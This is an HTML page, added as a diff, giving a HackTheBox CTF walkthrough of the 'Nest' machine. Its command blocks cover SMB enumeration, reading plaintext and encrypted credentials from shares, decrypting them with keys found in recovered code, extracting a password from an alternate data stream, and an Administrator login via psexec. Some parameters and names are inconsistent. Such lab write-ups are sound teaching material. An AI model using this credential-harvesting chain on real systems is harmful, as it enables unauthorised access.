@@ -1,0 +1,180 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Nest HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/nest-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-02-25T15:09:24+00:00">February 25, 2021</time><time class="updated" datetime="2025-06-22T11:36:56+00:00">June 22, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to crack a machine called Nest. It was created by <span style="color: #0000ff;"><strong>VbScrub</strong></span>. This is a Capture the Flag type of challenge. This machine is hosted on HackTheBox. Let’s get cracking!</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Nmap Scan</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating SMB Shares</span></li>
+<li><span style="color: #000000;">Downloading Files from SMB</span></li>
+<li><span style="color: #000000;">Enumerating TempUser</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating Config files for Internal Paths</span></li>
+<li><span style="color: #000000;">Enumerating C. Smith User</span></li>
+<li><span style="color: #000000;">Extracting RUScanner Files</span></li>
+<li><span style="color: #000000;">Inspecting VB Script to find Decrypt String</span></li>
+<li><span style="color: #000000;">Decoding C. Smith Password</span></li>
+<li><span style="color: #000000;">Reading User Flag</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating HQK Reporting Tool</span></li>
+<li><span style="color: #000000;">Extracting Debug Password from ADS</span></li>
+<li><span style="color: #000000;">Extracting Administrator Encrypted Password</span></li>
+<li><span style="color: #000000;">Decrypting Administrator Password</span></li>
+<li><span style="color: #000000;">Reading the Root Flag</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
+<p><span style="color: #000000;">IP Address assigned: <strong>10.129.101.34</strong></span></p>
+<p><span style="color: #000000;">Now that we have the IP Address. We need to enumerate open ports on the machine. For this, we will be running a nmap scan.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.129.101.34</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eqfqZFjsRXA/YDe5Op7TyZI/AAAAAAAAuQw/gdw6LLpDjfMrH3uf5AxdZIN4yQY7IdoRwCLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">The Nmap Version scan quickly gave us some great information. It positively informed that SMB (445) service is running on the machine.</span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">Since we have the SMB service, we start by looking for users inside the SMB. We connect using smbclient and we find that there is a share by the name of Data. We reconnect to the Data share. Here we find multiple directories. We first got inside the Shared directory</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient -L 10.129.101.34
+smbclient \\\\10.129.101.34\\Data
+cd Shared\
+cd Templates\
+cd HR\
+get "Welcome Email.txt"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-U0lVa2lSEDc/YDe5W9uTGpI/AAAAAAAAuQ0/dh_xBMErB-wEiripCzgVij_86WX0qPDngCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">Here we found Maintenance and Templates directories. We went inside the Templates directory to find HR and Marketing directory. We traversed inside the HR directory. Here we found a Welcome Email text file. To inspect it we download it to our local machine. We went back to the Maintenance directory to find a Maintenance Alerts text file. Then we download it as well.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd Maintenance
+get "Maintenance Alerts.txt"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--7NTmH4jZL0/YDe5b3RdNKI/AAAAAAAAuQ4/Zu2MnqEynOAbDJkdS6MyTtwZ6-6ztAlDgCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">We read the Welcome Email to find a set of credentials for the user TempUser.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat 'Welcome Email.txt'
+Username: TempUser
+Password welcome2019</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SOTGDPENFJk/YDe5gAOmYCI/AAAAAAAAuRA/JPmWFw7suxosMXXT59F568nd8aCvQnoPACLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">We reconnect to the SMB service but this time as TempUser. Then, we start looking around. Then, we found an IT directory. Inside it there were multiple directories. We entered the Config directory. There were bunch of directories We reconnect to the SMB service but this time as Temp User. We start looking around. WE found an IT directory. Inside it there were multiple directories. We entered the Config directory. There were a bunch of applications directories present there. It might be the files of the various applications installed on the target machine or the software that is shared on the network to be accessible to each user.<br/>
+</span></p>
+<h4><span style="color: #000000;">Configuration Analysis</span></h4>
+<p><span style="color: #000000;">The RU Scanner seemed a bit odd. We thought to look inside it.  We found its configuration file. Time to download it to our local machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient \\\\10.129.101.34\\Data -U TempUser
+cd IT
+cd Configs
+cd "RU Scanner"
+get RU_config.xml</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TdkYnDT8NUY/YDe5kW4m2II/AAAAAAAAuRE/aTsqOemaBJofm0NGX5N9X13AuIyIJ-S2QCLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">So, we went back to the Config Directory and got all the config files of all the other applications as well. There we downloaded all of them to our local machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd Configs
+cd NotepadPlusPlus
+get config.xml</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-17MsYrwJNbM/YDe5qR9jnCI/AAAAAAAAuRM/Ar7dwPegTfQy-UKssmKG8EQLyPkNoYwDgCLcBGAsYHQ/s16000/6.1.png"/></span></p>
+<p><span style="color: #000000;">Then, we read the config.xml file of the Notepad plus to find that there are multiple paths of different files that are accessed by the Notepad Plus Plus. We also got to know about 2 users. Carl and C.Smith.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">C:\windows\System32\drivers\etc\hosts
+\\HTB-NEST\Secure$\IT\Carl\Temp.txt
+C:\Users\C.Smits\Desktop\todo.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NIN52rpb7ow/YDe5u9UXotI/AAAAAAAAuRQ/mr1gfqI5GHgXCT3wG_o_tnwyayVvOTXvACLcBGAsYHQ/s16000/6.2.png"/></span></p>
+<p><span style="color: #000000;">We read the RU Scanner’s config file to get the c. smith user’s credentials. but the password seems to be encrypted.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat RU_config.xml
+Username: c.smith
+fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AwvbsS-8Aa8/YDe50FxJ8rI/AAAAAAAAuRc/IxvB-q1sbloA3yIV_DM59PRKyV9xdGxGgCLcBGAsYHQ/s16000/6.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">Back to our SMB session we get inside the Secure Share and get inside the IT directory but we are not able to list its contents. Hence, we move forward with the Chris directory as shown in the image. We enumerate the VB Projects directory to find a WIP folder. Inside that, we had a RU directory. Inside the directory, we found the consolidated code which is basically a .NET VB project. RUScanner.sln is the main Visual Studio project file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient \\\\10.129.101.34\\Secure -U TempUser
+cd IT
+cd Carl
+cd "VB Projects"
+cd WIP
+cd RU</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Hst1OjpNMbo/YDe57WnQi_I/AAAAAAAAuRg/Ejwmo0V0NlEzNOWmfhTl3GqKIqK6jvIJACLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">Inside the RUScanner directory, we found multiple bin files and Visual basic files. We downloaded all of those files to our local machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd RUScanner
+get Utils.vb
+get Module1.vb</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Zn-MA4wHtMc/YDe6AQX57eI/AAAAAAAAuRo/yjHndMk3jIYtuJFnkc4Pokqfa03blVirgCLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">While inspecting the code, we saw that the Utils.vb, a class file that contained EncryptString and DecryptString functions. There is a reference to this in Module1.vb1 as shown in the image below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
+Encrypt(PlainString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tjNiowOuA9I/YDe6HuzWWyI/AAAAAAAAuRw/1hMr0BixvrQxXFAIC6xa37_YfCukkPWEgCLcBGAsYHQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">We opened the code form the script into a C# Online Complier known as .NET Fiddle and replace the string inside the Decrypt String with the password hash we found for the user C. Smith. When we run the code, the password gets decrypted and we get the clear text password for C. Smith user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=
+xRxRxPANCAK3SxRxRx</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-f6o7qGTq6EE/YDe6Lt1hxcI/AAAAAAAAuR4/-naFN-mI3T8jKo8ozgAEWFp_4z-tRhadACLcBGAsYHQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">Now that we have the credentials for C. Smith, we enumerate SMB shares accessible by him. We found the user.txt file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient \\\\10.129.101.34\\users -U C.Smith
+cd C.Smith
+get user.txt
+exit
+cat user.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-J1Prf-SgNfE/YDe6PkLB6xI/AAAAAAAAuR8/IFItxphYG9QTodj-_2IkeMaPAn0LhedEACLcBGAsYHQ/s16000/14.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">We login into the Users share using C. Smith’s credentials. Here, we found a directory by the name of HQK Reporting. It contained a total of 3 items. One directory by the name of AD Integration Module, one text file by the name of Debug Mode Password.txt and one XML file by the name of HQK_Config_Backup.xml</span></p>
+<p><span style="color: #000000;">We download all three to our local machine. We try to read the Debug Mode Password.txt and find that it is empty. Then we read the XML file to see a TCP port 4386. This might be the port where HQK Reporting Tool was running.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient \\\\10.129.101.34\\users -U C.Smith
+cd C.Smith
+cd "HQK Reporting"
+get HQK_Config_Backup.xml
+get "Debug Mode Password.txt"
+exit
+cat 'Debug Mode Password.txt'
+cat HQK_Config_Backup.xml</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OxPT9WKeHjI/YDe6TQvBQqI/AAAAAAAAuSE/VuYetO4-Cds1H7OEDOeiUen8d18dagr0wCLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">This is where we thought we are missing something. The Debug Mode Password shouldn’t be empty. We go back to the SMB share and see that it is reported as 0 in size there too. It is then when it hit us that it is possible to hide data in the Alternative Data Stream of a certain file. We decided to check for streams using allinfo command. Then, we found that there is an alternative data stream by the name of Password. So, we download the file again this time with the alternative data stream. Then, we read the password to find a password as shown in the image.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">allinfo "Debug Mode Password.txt"
+DEBUGM~1.TXT
+[:Passwword:$DATA]
+get DEBUGM~1.txt:password
+cat DEBUGM~1.txt: password
+WBQ201953D8w</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-o9_20gov7n8/YDe6cYOQfCI/AAAAAAAAuSM/bowCv9Zh4HYdXBh5WV_1cD-n-BL_e3MLACLcBGAsYHQ/s16000/16.png"/></span></p>
+<h4><span style="color: #000000;">Gaining Administrator Access</span></h4>
+<p><span style="color: #000000;">We used the telnet to connect to the service at port 4386. Since we don’t know our way around an HQK Reporting Service, we use the help command to understand the service. If we remember correctly the password, we just recovered is a Debug password and HQK Reporting service has a Debug mode. Hence, we ran the debug command using the password. This enabled the debug mode. We used to help again to check if new commands have appeared or not. Here, we find a command setdir. Which we use it with the list command to find the LDAP directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">telnet 10.129.101.34 4386
+help
+DEBUG WBQ201953D8w
+setdir ..
+list
+LDAP</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XQb9VVfdUBk/YDe6kE3kbTI/AAAAAAAAuSU/S-_1s2KI40Q-yx4RNvxTayUwfms23dfqgCLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">Entering LDAP directory, we find the ldap.conf file. After a bit of tinkering, we found that the showquery command can read the contents of a file. But it has to be used with the index number of the file. Like if you want to read the first file in the directory use it like showquery 1. and so on. So, we read the file using the showquery command to find another encrypted password for the Administrator.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">setdir ldap
+list
+showquery 2
+User=Administrator
+Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fE-yETfHuvw/YDe6w_zroNI/AAAAAAAAuSc/_x040sH88FU3JNshGCxYsMtqVPoiS2kQwCLcBGAsYHQ/s16000/18.png"/></span></p>
+<p><span style="color: #000000;">There is an executable file called HqkLdap.exe inside the same directory, we download it through our SMB session.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd "AD Integration Module"
+get HqkLdap.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-r_618Lf9RcA/YDe62cKc0uI/AAAAAAAAuSg/XWwRyxHBK0AVL1gCkrnX912mjGcKnBeQACLcBGAsYHQ/s16000/19.png"/></span></p>
+<p><span style="color: #000000;">We use the dnSpy to inspect the code and we found the Encrypted String function as shown in the image.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z")</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tScBznfP9aY/YDe67I6XUAI/AAAAAAAAuSk/9GiBBrnyXWYwuz3fHMN8pbq8OTbUHAD5wCLcBGAsYHQ/s16000/20.png"/></span></p>
+<p><span style="color: #000000;">After inspecting the code, we feel like the code is trying to integrate with Active Directory that means that if we crack this password, we can get the administrator access on the target machine. We went back to the Fiddle and then replaced the encrypted code and ran the code. Then we have the unencrypted password.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">(Decrypt, "yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=", 667912, "131Rf99", 3, "1L1SA61493DRV53Z", 256)
+XtH4nkS4Pl4y1nGX</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PTbin2EBOzM/YDe6_13VWQI/AAAAAAAAuSo/dPf7Lf_repQ3wWc3zn69mYW0oiOIuXpMQCLcBGAsYHQ/s16000/21.png"/></span></p>
+<p><span style="color: #000000;">We used the password we just cracked to get the session on the target machine as Administrator. Now we will read the root flag and conclude this machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 psexec.py Administrator@10.129.101.34
+cd C:\Users\Administrator\Desktop\
+type root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MO-RC2d2hWg/YDe7Em0ETuI/AAAAAAAAuSs/Cf6-7m0RAxIgiJNnXox4lA3Ie9BmrBBNgCLcBGAsYHQ/s16000/22.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Can be Contacted on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
